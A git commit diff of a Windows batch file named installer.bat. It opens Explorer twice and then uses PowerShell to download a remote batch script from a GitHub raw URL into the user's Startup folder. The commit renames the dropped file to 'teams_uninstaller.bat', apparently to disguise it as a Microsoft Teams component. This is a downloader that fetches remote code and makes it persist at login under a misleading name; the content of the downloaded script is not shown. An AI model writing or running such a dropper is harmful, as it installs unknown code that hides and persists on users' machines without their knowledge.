ca5da6f3c4350d7171414775e166b5ce07751ef1
sossinayDev <125735344+sossinayDev@users.noreply.github.com>
2024-08-21 14:28:24 +0200

    Update installer.bat

--- stuff/alcrax/installer.bat
+++ stuff/alcrax/installer.bat
@@ -1,5 +1,6 @@
 start explorer
 start explorer
 
-powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/main.bat' -OutFile '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\send_to_teams.bat'"
+powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/sossinayDev/storage-9a/main/stuff/alcrax/main.bat' -OutFile \"$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\teams_uninstaller.bat\""
+
 
